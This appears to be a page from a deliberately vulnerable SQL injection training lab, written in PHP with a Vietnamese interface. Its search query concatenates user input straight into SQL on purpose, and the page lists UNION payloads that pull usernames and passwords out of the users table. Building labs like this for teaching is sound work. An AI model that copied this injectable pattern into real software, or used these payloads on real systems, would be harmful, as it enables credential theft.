<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection UNION - Rò Rỉ Dữ Liệu</title>
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/search.css">
</head>
<body>
    <?php
    include 'nav.php';
    echo getNavbar('search.php');
    ?>

    <div class="container">
        <div class="header">
            <div class="title">
                🔍 <div class="vulnerable-badge">UNION SQLi</div>
            </div>
            <div class="description">
                Demo tấn công rò rỉ dữ liệu bằng UNION SQL injection
            </div>
        </div>

        <div class="search-form">
            <form method="get">
                <div class="form-group">
                    <input type="text" name="q" class="form-input"
                           placeholder="Tìm tên đăng nhập hoặc chèn UNION..."
                           value="<?php echo isset($_GET['q']) ? htmlspecialchars($_GET['q']) : ''; ?>">
                    <div class="form-actions">
                        <button type="submit" name="action" value="search" class="btn btn-primary">
                            <span>🔍</span>
                            <span>Tìm Kiếm Union</span>
                            <span>🕵️‍♂️</span>
                        </button>

                        <button type="button" onclick="showSQL()" class="btn btn-info">
                            <span>🔍</span>
                            <span>XEM SQL QUERY</span>
                        </button>
                    </div>
                </div>
            </form>
        </div>

        <div class="results-section">
            <?php
            if (isset($_GET['q'])) {
                $q = $_GET['q'];
                $conn = new mysqli('db', 'demo', 'demopass', 'demo');

                if ($conn->connect_error) {
                    echo '<div class="no-results">Kết nối cơ sở dữ liệu thất bại</div>';
                } else {
                    // ⚠️ LỖ HỔNG: Ghép chuỗi trực tiếp
                    $sql = "SELECT username, email FROM users WHERE username LIKE '%$q%'";
                    $res = $conn->query($sql);

                    $resultsCount = $res ? $res->num_rows : 0;
                    ?>
                    <div class="results-header">
                        <div class="results-title">Kết quả tìm kiếm cho: "<?php echo htmlspecialchars($q); ?>"</div>
                        <div class="results-count"><?php echo $resultsCount; ?> kết quả được tìm thấy</div>
                    </div>

                    <?php if ($res && $resultsCount > 0): ?>
                        <table class="data-table">
                            <thead>
                                <tr>
                                    <th>👤 Tên đăng nhập</th>
                                    <th>📧 Email</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php while ($row = $res->fetch_assoc()): ?>
                                    <tr>
                                        <td class="data-username"><?php echo htmlspecialchars($row['username']); ?></td>
                                        <td class="data-email"><?php echo htmlspecialchars($row['email']); ?></td>
                                    </tr>
                                <?php endwhile; ?>
                            </tbody>
                        </table>
                    <?php else: ?>
                        <div class="no-results">
                            Không tìm thấy kết quả cho truy vấn tìm kiếm của bạn.
                        </div>
                    <?php endif;

                    $conn->close();
                }
            }
            ?>
        </div>

        <div class="payloads-section">
            <div class="payloads-title">💡 Payload SQL Injection để thử:</div>
            <ul class="payload-list">
                <li class="payload-item">
                    <strong>UNION cơ bản:</strong>
                    <span class="payload-code">' UNION SELECT username, password FROM users --</span>
                </li>
                <li class="payload-item">
                    <strong>Nối dữ liệu:</strong>
                    <span class="payload-code">' UNION SELECT 1, concat(username, ':', password) FROM users --</span>
                </li>
                <li class="payload-item">
                    <strong>Nhiều cột:</strong>
                    <span class="payload-code">' UNION SELECT username, email FROM users LIMIT 1 --</span>
                </li>
            </ul>
            <p style="margin-top: 15px; font-size: 0.9em; color: rgba(255, 255, 255, 0.8);">
                <strong>Lưu ý:</strong> Truy vấn mong đợi 2 cột (username, email). Truy vấn UNION phải khớp cấu trúc này.
            </p>
        </div>

        <!-- SQL Display Modal -->
        <div id="sqlModal" class="sql-modal">
            <div class="sql-modal-content">
                <div class="sql-modal-header">
                    <h3>🔍 SQL Query Được Thực Thi</h3>
                    <button onclick="closeSQL()" class="close-modal">&times;</button>
                </div>
                <div class="sql-modal-body">
                    <div class="sql-warning">
                        ⚠️ CẢNH BÁO: Đây là SQL query nguy hiểm! Input chứa trong LIKE pattern.
                    </div>
                    <div class="sql-display">
                        <div class="sql-label">Query sẽ thực thi:</div>
                        <div class="sql-code-display" id="sqlDisplay"></div>
                    </div>
                    <div class="sql-explanation">
                        <p><strong>Cách hoạt động:</strong></p>
                        <p>Input của bạn được nhồi vào <strong>LIKE '%...%'</strong> query.</p>
                        <p>UNION attack có thể extract data từ bất kỳ table nào trong database!</p>
                    </div>
                </div>
            </div>
        </div>

        <script>
        function showSQL() {
            const query = document.querySelector('input[name="q"]').value || '[từ_khoá_trống]';
            const sql = `SELECT username, email FROM users WHERE username LIKE '%${query}%'`;

            document.getElementById('sqlDisplay').textContent = sql;
            document.getElementById('sqlModal').style.display = 'block';
        }

        function closeSQL() {
            document.getElementById('sqlModal').style.display = 'none';
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('sqlModal');
            if (event.target == modal) {
                modal.style.display = 'none';
            }
        }
        </script>

    </div>
</body>
</html>
